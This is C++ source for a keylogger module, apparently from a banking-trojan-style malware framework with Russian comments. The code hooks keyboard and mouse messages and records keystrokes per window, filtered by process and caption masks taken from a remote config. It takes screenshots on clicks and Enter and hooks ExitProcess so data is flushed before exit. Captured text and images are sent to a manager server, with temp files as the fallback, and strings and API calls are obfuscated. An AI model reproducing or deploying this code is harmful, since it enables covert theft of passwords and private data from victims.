#include "keylogger.h"
#include "core\debug.h"
#include "core\util.h"
#include "core\file.h"
#include "core\hook.h"
#include "manager.h"
#include "core\rand.h"
#include "main.h"

bool StartKeyLoggerFirstNScreenshot( int n )
{
	//настраиваем фильтр на нажатие кнопки мыши
	uint mouseMsg[1]; 
	mouseMsg[0] = WM_LBUTTONDOWN;
	KeyLogger::FilterMsg* filterMouse = new KeyLogger::FilterMsg( mouseMsg, 1 );
	if( filterMouse )
	{
		//настраиваем фильтр на нажатие Enter
		uint keyMsg[1];
		keyMsg[0] = WM_KEYDOWN;
		uint keys[1];
		keys[0] = VK_RETURN;
		KeyLogger::FilterKey* filterKey = new KeyLogger::FilterKey( keyMsg, 1, keys, 1 );
		if( filterKey )
		{
			//создаем совместный фильтр
			KeyLogger::FilterMsgBase* filters[2];
			filters[0] = filterMouse;
			filters[1] = filterKey;
			KeyLogger::FilterMsgOr* filtersOr = new KeyLogger::FilterMsgOr( (const KeyLogger::FilterMsgBase**)filters, 2 );
			if( filtersOr )
			{
				KeyLoggerFirstNScreenShot* logger = new KeyLoggerFirstNScreenShot( filtersOr, n );
				if( logger )
				{
					if( KeyLogger::JoinDispatchMessage(logger) )
					{
						DbgMsg( "Запущен KeyLoggerFirstNScreenshot(%d)", n );
						return true;
					}
					delete logger;
				}
				delete filtersOr;
			}
			delete filterKey;
		}
		delete filterMouse;
	}
	return false;
}


KeyLoggerFirstNScreenShot::KeyLoggerFirstNScreenShot( KeyLogger::FilterMsgBase* filter, int countScr ) 
	: KeyLogger::ExecForFilterMsg(filter), countScreenShot(countScr)
{
	curr = 0;
}

void KeyLoggerFirstNScreenShot::Exec( KeyLogger::FilterMsgParams& params )
{
	if( curr < countScreenShot )
	{
		DbgMsg( "Screenshot %d, msg %d (%x)", curr, params.msg, params.msg );
		if( Screenshot::Make( 0, memScreenshot ) )
		{
			StringBuilderStack<16> fileName;
			Rand::Gen( fileName, 5, 10 );
			fileName += _CS_(".png");
			ManagerServer::SendData( _CS_("screenshot"), memScreenshot.Ptr(), memScreenshot.Len(), true, fileName );
			curr++;
		}
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static bool KeyLoggerAllCharsDestroyWindow( Hook::ParamsDestroyWindow& params )
{
	KeyLoggerAllChars* logger = (KeyLoggerAllChars*)params.tag;
	logger->SendWindowData(params.hWnd);
	return false;
}


typeExitProcess RealExitProcess;
KeyLoggerAllChars* logger = 0;

void WINAPI HookExitProcess( UINT uExitCode )
{
	if( logger ) logger->SendWindowData(0);
	DbgMsg( "ExitProcess" );
	Delay(1000); //делаем задержку, чтобы успели отослаться данные
	RealExitProcess(uExitCode);
}

KeyLoggerAllChars::KeyLoggerAllChars( KeyLogger::FilterMsgBase* filter, StringArray& captions ) : KeyLogger::ExecForFilterMsg(filter)
{
	for( int i = 0; i < captions.Count(); i++ )
	{
		if( !captions[i]->IsEmpty() )
		{
			DbgMsg( "add caption mask '%s'", captions[i]->c_str() );
			maskCaptions.Add( captions[i] );
		}
	}
}

KeyLoggerAllChars::~KeyLoggerAllChars()
{
}

bool KeyLoggerAllChars::Start( const char* nameProcess )
{
	Mem::Data klgData;
	bool myProcess = true;
	StringBuilder masks;
	
	if( ManagerServer::GetSharedFile(_CS_("klgconfig"), klgData ) )
	{
		myProcess = false;
		StringBuilder cfg;
		klgData.ToString(cfg);
		StringArray processes = cfg.Split( '\n' );
		int lenNameProcess = Str::Len(nameProcess);
		for( int i = 0; i < processes.Count(); i++ )
		{
			StringBuilder& s = processes[i];
			if( s.IsEmpty() ) continue; //пустая строка
			int lenMask = s.IndexOf(';');
			if( lenMask < 0 ) lenMask = s.Len();
			if( Str::IndexOf( nameProcess, s, lenNameProcess, lenMask ) >= 0 ) //в конфиге указан данный процесс
			{
				myProcess = true;
				s.Substring( masks, lenMask + 1 );
			}
		}
	}

	if( !myProcess ) return false;

	uint msg[1]; 
	msg[0] = WM_KEYDOWN;
	//msg[0] = WM_CHAR;
	KeyLogger::FilterMsg* filterMsg = new KeyLogger::FilterMsg( msg, 1 );
	if( filterMsg )
	{
		StringArray captions = masks.Split(';');
		logger = new KeyLoggerAllChars( filterMsg, captions );
		if( logger )
		{
			if( KeyLogger::JoinDispatchMessage(logger) && Hook::Join_DestroyWindow( KeyLoggerAllCharsDestroyWindow, logger ) )
			{
				RealExitProcess = (typeExitProcess) Hook::Set( API(KERNEL32,ExitProcess), HookExitProcess );
				DbgMsg( "Запущен KeyLoggerAllChars()" );
				return true;
			}
			delete logger;
		}
		delete filterMsg;
	}
	return false;
}

struct KeyName
{
	int code;
	char* name;
};

static KeyName keysName[] =
{
	{ VK_BACK, _CT_("back") },
	{ VK_ESCAPE, _CT_("esc") },
	{ VK_LEFT, _CT_("left") },
	{ VK_RIGHT, _CT_("right") },
	{ VK_UP, _CT_("up") },
	{ VK_DOWN, _CT_("down") },
	{ VK_RETURN, _CT_("enter") },
	{ VK_INSERT, _CT_("insert") },
	{ VK_DELETE, _CT_("delete") },
	{ 0, 0 }
};

static bool KeyCodeToString( uint virtKey, uint scanCode, StringBuilder& key )
{
	BYTE keyState[256];
	API(USER32, GetKeyboardState)(keyState);
	DWORD threadId = API(KERNEL32, GetCurrentThreadId)();
	HKL hkl = API(USER32, GetKeyboardLayout)(threadId);
	WORD c = 0;
	API(USER32, ToAsciiEx)( virtKey, scanCode, keyState, &c, 0, hkl );
	if( c < 32 ) //какая-то управляющая клавиша, определяем ее имя по таблице
	{
		int i = 0;
		if( c == VK_RETURN )
		{
			key += '\r';
			key += '\n';
		}
		else
			while( keysName[i].code )
			{
				if( keysName[i].code == virtKey )
				{
					key += '{';
					key += DECODE_STRING(keysName[i].name);
					key += '}';
					break;
				}
				i++;
			}
	}
	else
		key += (char)c;
	return true;
}

//проверяет находится ли какая-то маска из массива в тексте, возвращает индекс маски, если -1, то никакая маска не подходит
static int ContainsMask( const StringArray& masks, const StringBuilder& text )
{
	for( int i = 0; i < masks.Count(); i++ )
	{
		if( text.IndexOf( masks[i] ) >= 0 )
		{
			return i;
		}
	}
	return -1;
}

void KeyLoggerAllChars::Exec( KeyLogger::FilterMsgParams& params )
{
	StringBuilderStack<16> key;
	KeyCodeToString( params.wparam, (params.lparam >> 16) & 0xff, key );

	HwndText* ctrl = 0;
	for( int i = 0; i < ctrls.Count(); i++ )
		if( ctrls[i]->hwnd == params.hwnd )
		{
			ctrl = ctrls[i];
			break;
		}
	if( ctrl == 0 )
	{
		ctrl = new HwndText();
		ctrl->hwnd = params.hwnd;
		ctrl->parent = Window::GetParentWithCaption(params.hwnd);
		if( !ctrl->parent )	ctrl->parent = ctrl->hwnd;
		Window::GetCaption( ctrl->parent, ctrl->parentCaption );
		if( maskCaptions.Count() > 0 ) //логгируем окна только по маске
		{
			//сравниваются символы в нижем регистре, маски приведены к нижнему регистру, приводим и заголовок окна к такому же виду
			StringBuilderStack<256> caption;
			caption = ctrl->parentCaption;
			caption.Lower();
			ctrl->ignore = ContainsMask( maskCaptions, caption ) < 0;
		}
		else //если маски не задана, то логгируем все подряд
			ctrl->ignore = false;
		API(KERNEL32, GetSystemTime)( &ctrl->beg );
		ctrl->end = ctrl->beg;
		ctrls.Add(ctrl);
	}
	if( ctrl && !ctrl->ignore )
	{
		ctrl->text += key;
		API(KERNEL32, GetSystemTime)( &ctrl->end );
		DbgMsg( "%08x:%08x '%s'", ctrl->hwnd, ctrl->parent, ctrl->text.c_str() );
	}
}

void KeyLoggerAllChars::SendWindowData( HWND hwnd )
{
	StringBuilderStack<3> end; end.FillEndStr();
//	StringBuilderStack<16> delim( _CS_("----------") );
	StringBuilder text;
	int i = 0;
	StringBuilderStack<256> kl;
	StringBuilderStack<64> nameProcess;
	Process::Name(nameProcess);

	while( i < ctrls.Count() )
	{
		HwndText* ctrl = ctrls[i];
		if( (hwnd == 0 || ctrls[i]->parent == hwnd) && !ctrls[i]->text.IsEmpty() )
		{
			if( text.IsEmpty() )
			{
				kl.Format( _CS_("Keylogger: [%02d.%02d.%04d %02d:%02d:%02d]-[%02d.%02d.%04d %02d:%02d:%02d]\r\n{\r\nProcess: %s\r\n"), 
					(int)ctrl->beg.wDay, (int)ctrl->beg.wMonth, (int)ctrl->beg.wYear, (int)ctrl->beg.wHour, (int)ctrl->beg.wMinute, (int)ctrl->beg.wSecond,
					(int)ctrl->end.wDay, (int)ctrl->end.wMonth, (int)ctrl->end.wYear, (int)ctrl->end.wHour, (int)ctrl->end.wMinute, (int)ctrl->end.wSecond,
					nameProcess.c_str() );
				text += kl;
				text += _CS_("Window: " );
				text += ctrls[i]->parentCaption;
				text += end;
			}
			//text += delim;
			//text += end;
			text += ctrls[i]->text;
			text += end;
			ctrls.Del(i);
		}
		else
			i++;
	}
	if( !text.IsEmpty() )
	{
		text += _CS_("}\r\n");
		if( !ManagerServer::SendData(_CS_("keylogger"), text.c_str(), text.Len(), false ) )
		{
			StringBuilderStack<MAX_PATH> fileName;
			Path::GetTempPath( fileName, Config::TempNameFolder );
			Path::CreateDirectory(fileName);
			char buf[32];
			Str::Format( buf, _CS_("%d.txt"), buf );
			Path::AppendFile( fileName, buf );
			DbgMsg("Не удалось отослать данные кейлога чрез пайпы, пишем в файл %s, %d байт", fileName, text.Len() );
			File::Write( fileName, text );
		}
	}
}
